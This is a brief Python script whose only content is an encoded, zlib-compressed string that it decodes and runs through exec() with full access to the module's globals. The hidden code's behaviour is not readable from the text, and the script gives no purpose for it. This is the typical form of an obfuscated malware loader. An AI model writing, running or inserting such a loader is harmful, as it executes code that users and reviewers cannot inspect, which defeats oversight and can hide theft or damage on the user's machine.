#!/usr/bin/env python3
import base64, zlib, sys
_payload = 'eJxNjsEKgzAQBe/5iiUnA+166E3o0Q/R9GEXNEk3K+rfK4VCT3OaYWQpWY0UnxXVqjM9OkdFJRk1vt8RV5M0UcJGNaoUY2YfHM15fv4snmCNf5uV2rXtMthQZYTyhpHl1eJx1zxK4nL4wIbdHOEqN1cjOOwRxaj/QnKioRL+H1SzduRvCO4E0rw68g=='
_data = base64.b64decode(_payload)
_src = zlib.decompress(_data).decode('utf-8')
_globals = globals()
exec(compile(_src, "<decoded>", "exec"), _globals)
